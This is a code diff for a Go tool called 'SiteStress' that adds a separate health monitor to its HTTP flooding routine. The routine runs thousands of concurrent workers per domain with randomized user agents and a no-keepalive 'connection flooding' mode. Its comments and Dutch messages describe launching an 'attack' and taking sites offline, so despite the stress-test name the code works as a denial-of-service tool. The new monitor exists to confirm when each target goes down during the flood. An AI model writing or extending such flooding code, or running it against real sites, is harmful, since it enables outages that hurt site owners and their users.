@@ -18,7 +18,7 @@ import (
 	"github.com/miekg/dns"
 )
 
-const version = "3.4.0"
+const version = "3.4.1"
 
 func printBanner() {
 	fmt.Println("SiteStress (part of Lucas Kit) is made by Lucas Mangroelal | lucasmangroelal.nl")
@@ -188,11 +188,6 @@ func applyLevelSettings(o *options) {
 		o.concurrency = 20000
 	}
 
-	// Level 9/10 force no-keepalive for flooding if not specified?
-	// No, let's keep that manual or suggestive. Flooding keeps sockets busy.
-	// Actually for "offline taking", socket exhaustion (keep-alive) is sometimes effective too.
-	// Let's stick to concurrency scaling for now.
-
 	fmt.Printf("🎚️  Power Level: %d -> %d Workers\n", o.level, o.concurrency)
 }
 
@@ -287,6 +282,88 @@ func runMeasure(domain string) {
 	fmt.Printf("   sitestress -d %s -t 5 -level %d\n", domain, recLevel)
 }
 
+func startHealthMonitor(s *domainStats, deadline time.Time) {
+	// Separate client for monitoring - clean state
+	// Ensure we don't use the same overloaded transport as the attackers
+	monitorClient := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			DisableKeepAlives: true,  // Force fresh connection
+			ForceAttemptHTTP2: false, // Simple HTTP/1.1 check usually reliable
+		},
+	}
+
+	ticker := time.NewTicker(3 * time.Second)
+	defer ticker.Stop()
+
+	// Wait a bit before first check
+	time.Sleep(1 * time.Second)
+
+	for time.Now().Before(deadline) {
+		<-ticker.C
+
+		req, _ := http.NewRequest("GET", s.targetURL, nil)
+		// Unique Agent so we can distinguish logs if needed
+		req.Header.Set("User-Agent", "SiteStress-Monitor/1.0")
+
+		resp, err := monitorClient.Do(req)
+
+		s.mu.Lock()
+		wasDown := s.siteDown
+		s.mu.Unlock()
+
+		if err != nil {
+			// Monitor failed! Only NOW we say it's down.
+			// This confirms it's not just local port exhaustion (hopefully monitorClient can finds a gap)
+			if !wasDown {
+				s.mu.Lock()
+				if !s.siteDown {
+					s.siteDown = true
+					s.siteDownSince = time.Now()
+					// Simplify error message
+					errMsg := fmt.Sprintf("%v", err)
+					if strings.Contains(errMsg, "timeout") {
+						errMsg = "Timeout"
+					}
+					msg := fmt.Sprintf("[%s] 💥 %s is DOWN (Health Check Failed: %s)!", time.Now().Format(time.TimeOnly), s.domain, errMsg)
+					s.statusLog = append(s.statusLog, msg)
+					fmt.Println("\n" + msg)
+				}
+				s.mu.Unlock()
+			}
+		} else {
+			resp.Body.Close()
+			if resp.StatusCode >= 500 {
+				// Server Error
+				if !wasDown {
+					s.mu.Lock()
+					if !s.siteDown {
+						s.siteDown = true
+						s.siteDownSince = time.Now()
+						msg := fmt.Sprintf("[%s] 💥 %s is DOWN (Status %d)!", time.Now().Format(time.TimeOnly), s.domain, resp.StatusCode)
+						s.statusLog = append(s.statusLog, msg)
+						fmt.Println("\n" + msg)
+					}
+					s.mu.Unlock()
+				}
+			} else {
+				// Site is UP
+				if wasDown {
+					s.mu.Lock()
+					if s.siteDown {
+						downTime := time.Since(s.siteDownSince).Round(time.Second)
+						s.siteDown = false
+						msg := fmt.Sprintf("[%s] ✅ %s is weer ONLINE (was %v plat).", time.Now().Format(time.TimeOnly), s.domain, downTime)
+						s.statusLog = append(s.statusLog, msg)
+						fmt.Println("\n" + msg)
+					}
+					s.mu.Unlock()
+				}
+			}
+		}
+	}
+}
+
 func runAttack(domains []string, o options) {
 	duration := time.Duration(o.attackMinutes) * time.Minute
 	deadline := time.Now().Add(duration)
@@ -366,6 +443,15 @@ func runAttack(domains []string, o options) {
 		fmt.Printf("🎯 Target: %s\n", targetURL)
 	}
 
+	// Start Health Monitors (New in v3.4.1)
+	fmt.Println("🏥 Starting separate Health Monitors to avoid false positives...")
+	for _, stats := range allStats {
+		if stats == nil {
+			continue
+		}
+		go startHealthMonitor(stats, deadline)
+	}
+
 	fmt.Printf("\n🚀 Starten aanval (%d workers per domein)...\n", workersPerDomain)
 	if o.noKeepAlive {
 		fmt.Println("🔥 Mode: No-KeepAlive (Connection flooding)")
@@ -391,59 +477,22 @@ func runAttack(domains []string, o options) {
 					req.Header.Set("User-Agent", getRandomUserAgent())
 					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 
-					// Randomize connection header if keep alive is on, occasionally close to refresh?
-					// For now rely on transport settings.
-
 					resp, err := httpClient.Do(req)
 
-					s.mu.Lock()
-					isDown := s.siteDown
-					s.mu.Unlock()
+					// NOTE (v3.4.1): We NO LONGER check for down status here.
+					// At high concurrency, local errors (socket exhaustion) are common.
+					// We leave the up/down judgment to the Health Monitor goroutine.
 
 					if err != nil {
-						// Connection error
-						if !isDown {
-							s.mu.Lock()
-							if !s.siteDown {
-								s.siteDown = true
-								s.siteDownSince = time.Now()
-								msg := fmt.Sprintf("[%s] 💥 %s is DOWN (connection error)!", time.Now().Format(time.TimeOnly), s.domain)
-								s.statusLog = append(s.statusLog, msg)
-								fmt.Println("\n" + msg)
-							}
-							s.mu.Unlock()
-						}
+						// Attack failed (likely local limit or site down)
 						atomic.AddInt64(&s.failedRequests, 1)
 					} else {
 						io.Copy(io.Discard, resp.Body)
 						resp.Body.Close()
 
 						if resp.StatusCode >= 500 || resp.StatusCode == 429 {
-							if !isDown {
-								s.mu.Lock()
-								if !s.siteDown {
-									s.siteDown = true
-									s.siteDownSince = time.Now()
-									msg := fmt.Sprintf("[%s] 💥 %s is DOWN (status %d)!", time.Now().Format(time.TimeOnly), s.domain, resp.StatusCode)
-									s.statusLog = append(s.statusLog, msg)
-									fmt.Println("\n" + msg)
-								}
-								s.mu.Unlock()
-							}
 							atomic.AddInt64(&s.failedRequests, 1)
 						} else {
-							// Site is UP
-							if isDown {
-								s.mu.Lock()
-								if s.siteDown {
-									downTime := time.Since(s.siteDownSince).Round(time.Second)
-									s.siteDown = false
-									msg := fmt.Sprintf("[%s] ✅ %s is weer ONLINE (was %v plat). Re-engaging...", time.Now().Format(time.TimeOnly), s.domain, downTime)
-									s.statusLog = append(s.statusLog, msg)
-									fmt.Println("\n" + msg)
-								}
-								s.mu.Unlock()
-							}
 							atomic.AddInt64(&s.successRequests, 1)
 						}
 					}
@@ -453,8 +502,8 @@ func runAttack(domains []string, o options) {
 		}
 	}
 
-	// Monitor loop
-	ticker := time.NewTicker(2 * time.Second) // Sneller updaten voor leuk effect
+	// Monitor loop - only for UI updates now
+	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
 
 	// Hier wachten we tot tijd voorbij is OF interrupt
